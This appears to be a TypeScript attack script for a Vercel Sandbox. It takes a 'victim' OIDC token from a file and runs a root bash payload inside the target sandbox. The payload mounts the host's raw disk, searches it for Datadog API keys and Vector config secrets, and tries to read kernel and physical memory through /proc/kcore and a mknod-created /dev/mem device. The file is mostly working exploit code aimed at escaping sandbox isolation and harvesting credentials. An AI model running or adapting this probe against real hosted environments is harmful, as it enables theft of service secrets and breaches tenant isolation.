import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
mkdir -p /mnt/vda2
mount -t xfs /dev/vda /mnt/vda2 2>/dev/null
R=/mnt/vda2
echo "=== vector data/run dirs ==="
ls -la $R/var/lib/vector $R/var/run/vector 2>&1 | head
find $R/var/lib/vector $R/var/run $R/run 2>/dev/null -maxdepth 3 -type f -size -5M | head -20
echo "=== datadog key format search on disk (dc_ or 32hex) ==="
grep -rIs "dc_[a-f0-9]\\{30,40\\}" $R/etc $R/opt $R/var $R/run 2>/dev/null | head -5
grep -rIs "api-key" $R/etc/vector 2>/dev/null | head -10
echo "=== vector toml full tree ==="
find $R/etc/vector -type f 2>/dev/null
echo "=== /proc/kcore read attempt (python) ==="
python3 - <<'PYEOF'
import os
try:
    fd = os.open("/proc/kcore", os.O_RDONLY)
    data = os.pread(fd, 65536, 0)
    print("kcore read", len(data), "bytes, first bytes:", data[:16])
    print(data[:256])
except Exception as e:
    print("kcore err:", e)
PYEOF
echo "=== /dev/mem via mknod fresh path ==="
mknod /tmp/memdev c 1 1 2>&1
ls -la /tmp/memdev 2>&1
python3 - <<'PYEOF'
import os
try:
    fd = os.open("/tmp/memdev", os.O_RDONLY)
    data = os.pread(fd, 65536, 0)
    print("mem read", len(data), "bytes")
    print(data[:64])
except Exception as e:
    print("mem err:", e)
PYEOF
echo "=== check kernel cmdline (may hint mitigations) ==="
cat /proc/cmdline
echo "=== /proc/modules vsock/others ==="
grep -iE "vsock|mem|core" /proc/modules 2>/dev/null | head
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore25.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore25.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 90_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });